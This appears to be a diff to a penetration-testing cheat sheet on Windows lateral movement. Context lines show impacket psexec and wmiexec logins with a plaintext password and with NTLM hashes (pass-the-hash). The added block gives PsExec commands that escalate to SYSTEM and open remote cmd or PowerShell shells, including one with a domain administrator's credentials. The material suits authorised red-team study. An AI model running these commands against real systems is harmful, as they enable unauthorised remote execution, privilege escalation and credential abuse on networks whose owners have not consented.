@@ -7,6 +7,13 @@ impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59
 impacket-psexec Administrator:P@ssw0rd@192.168.10.131
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Orlando@192.168.10.122 
 ```
+```
+PsExec.exe -s -i cmd #To gain local system privileges:
+PsExec.exe -s \\PC-John powershell.exe
+PsExec.exe \\dc.whiteflag.local -u WHITEFLAG\Administrateur -p Defte@WF cmd
+
+```
+
 
 ### With Domain
 ```
